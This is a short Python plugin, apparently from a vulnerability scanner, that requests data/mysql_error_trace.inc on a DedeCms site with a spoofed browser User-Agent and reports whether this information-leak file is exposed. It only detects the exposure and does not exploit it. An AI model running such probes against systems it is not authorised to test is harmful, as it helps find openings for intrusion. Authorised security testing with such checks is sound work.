#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: DedeCms data/mysql_error_trace.inc 敏感信息泄露
referer: unknow
author: qianxiao996
description: DedeCms data/mysql_error_trace.inc 敏感信息泄露
'''
import re
import sys
import requests
import warnings
def run(url):
        result = ['data/mysql_error_trace.inc 敏感信息泄露', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
     
        vulnurl = url + 'data/mysql_error_trace.inc'
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if '<?php  exit();' in  req.text:
                result[2] = '存在'
                result[1] = vulnurl
            else:
                result[2]='不存在'
        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
